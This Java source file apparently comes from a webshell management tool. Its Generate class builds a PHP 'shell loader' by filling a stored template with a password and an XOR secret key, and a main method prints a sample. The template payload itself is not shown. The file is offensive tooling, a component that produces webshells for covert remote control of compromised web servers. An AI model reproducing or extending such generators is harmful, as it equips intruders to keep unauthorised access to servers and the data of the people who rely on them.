package vip.youwe.shell.shells.cryptions.phpXor;

import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.functions;

import java.io.InputStream;

class Generate {

    public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
        byte[] data = null;

        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/" + (isBin ? "raw.bin" : "base64.bin"));
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
            data = code.getBytes();
        } catch (Exception e) {
            Log.error(e);
        }
        return data;
    }


    public static void main(String[] args) {
        System.out.println(new String(GenerateShellLoder("123", "456", true)));
    }

}
